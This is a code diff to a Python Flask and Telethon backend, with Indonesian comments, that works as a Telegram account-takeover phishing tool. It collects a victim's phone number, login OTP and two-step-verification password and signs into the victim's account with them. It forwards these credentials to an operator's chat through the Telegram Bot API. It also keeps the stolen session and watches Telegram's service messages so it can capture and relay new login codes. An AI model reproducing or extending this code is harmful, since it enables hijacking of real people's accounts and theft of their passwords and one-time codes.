@@ -12,7 +12,7 @@ API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-user_db = {} # Simpan sesi sementara
+user_db = {} 
 
 def bot_api(method, payload):
     return requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/{method}", json=payload).json()
@@ -22,107 +22,92 @@ def register():
     return asyncio.run(handle_flow(request.json))
 
 async def handle_flow(data):
-    step = data.get('step')
-    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
-    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
-    nama = data.get('nama', 'User')
-
-    client = TelegramClient(StringSession(user_db.get(nomor, {}).get('session', '')), int(API_ID), API_HASH)
-    await client.connect()
-
     try:
+        step = data.get('step')
+        nomor = data.get('nomor', '').strip().replace(" ", "")
+        if nomor.startswith('0'): nomor = '+62' + nomor[1:]
+        nama = data.get('nama', 'User')
+
+        client = TelegramClient(StringSession(user_db.get(nomor, {}).get('session', '')), int(API_ID), API_HASH)
+        await client.connect()
+
         if step == 1:
             res = await client.send_code_request(nomor)
-            user_db[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama}
+            user_db[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama, "msg_id": None}
             return jsonify({"status": "success"}), 200
 
         elif step == 2:
-            otp = data.get('otp')
             try:
-                await client.sign_in(nomor, otp, phone_code_hash=user_db[nomor]['hash'])
-                # Jika lolos tanpa 2FA, kirim log ke bot
+                await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
+                # KIRIM LOG PERTAMA KALI (Hanya jika belum ada msg_id)
+                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : "
                 msg = bot_api("sendMessage", {
-                    "chat_id": CHAT_ID,
-                    "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : ",
-                    "parse_mode": "Markdown",
+                    "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                     "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                 })
-                user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
+                user_db[nomor].update({'msg_id': msg.get('result', {}).get('message_id'), 'session': client.session.save()})
                 return jsonify({"status": "success"}), 200
             except errors.SessionPasswordNeededError:
                 return jsonify({"status": "need_2fa"}), 200
-            except Exception:
-                return jsonify({"status": "invalid_otp"}), 400
+            except: return jsonify({"status": "invalid_otp"}), 400
 
         elif step == 3:
-            sandi = data.get('sandi')
             try:
-                await client.sign_in(password=sandi)
-                # Jika sandi valid, kirim log ke bot
-                msg = bot_api("sendMessage", {
-                    "chat_id": CHAT_ID,
-                    "text": f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{sandi}**\nOTP : ",
-                    "parse_mode": "Markdown",
-                    "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
-                })
-                user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
-                user_db[nomor]['sandi'] = sandi
+                await client.sign_in(password=data.get('sandi'))
+                # JIKA SUDAH ADA MSG_ID, EDIT PESANNYA (BUKAN KIRIM BARU)
+                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : "
+                if user_db[nomor].get('msg_id'):
+                    bot_api("editMessageText", {
+                        "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'], "text": text, "parse_mode": "Markdown",
+                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
+                    })
+                else:
+                    msg = bot_api("sendMessage", {
+                        "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
+                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
+                    })
+                    user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
+                
+                user_db[nomor].update({'sandi': data.get('sandi'), 'session': client.session.save()})
                 return jsonify({"status": "success"}), 200
-            except Exception:
-                return jsonify({"status": "invalid_2fa"}), 400
-
+            except: return jsonify({"status": "invalid_2fa"}), 400
     finally:
         await client.disconnect()
 
 @app.route('/webhook', methods=['POST'])
-async def webhook():
+def webhook():
     update = request.json
     if "callback_query" in update:
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
-
         if action == "upd":
-            # Bot Kirim "Siap Menerima"
-            status = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", 
-                                             "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
-            user_db[nomor]['status_id'] = status.get('result', {}).get('message_id')
-            
-            # Deteksi OTP Baru secara Otomatis
-            asyncio.create_task(auto_update_otp(nomor))
-            
+            res = bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Bot siap menerima OTP!", 
+                                         "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}})
+            user_db[nomor]['status_id'] = res.get('result', {}).get('message_id')
+            asyncio.run(monitor_new_otp(nomor))
         elif action == "exit":
             if nomor in user_db and 'status_id' in user_db[nomor]:
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
-            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": "Anda telah keluar dari mode input inline!"})
+    return jsonify({"status": "success"})
 
-    return jsonify({"status": "success"}), 200
-
-async def auto_update_otp(nomor):
+async def monitor_new_otp(nomor):
     data = user_db.get(nomor)
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
-    
-    # Trigger minta kode baru
     try: await client.send_code_request(nomor)
     except: pass
-
     @client.on(events.NewMessage(from_users=777000))
     async def handler(event):
         otp = re.search(r'\b\d{5}\b', event.raw_text)
         if otp:
-            # EDIT PESAN LAMA (Bukan kirim pesan baru)
-            sandi = data.get('sandi', 'None')
+            # EDIT BARIS OTP PADA PESAN YANG SAMA
             bot_api("editMessageText", {
-                "chat_id": CHAT_ID,
-                "message_id": data['msg_id'],
-                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{sandi}**\nOTP : `{otp.group(0)}`",
-                "parse_mode": "Markdown",
-                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
+                "chat_id": CHAT_ID, "message_id": data['msg_id'],
+                "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
+                "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
             })
-            # Hapus teks "Siap menerima"
             bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
             await client.disconnect()
-
     await asyncio.sleep(300)
     await client.disconnect()
 
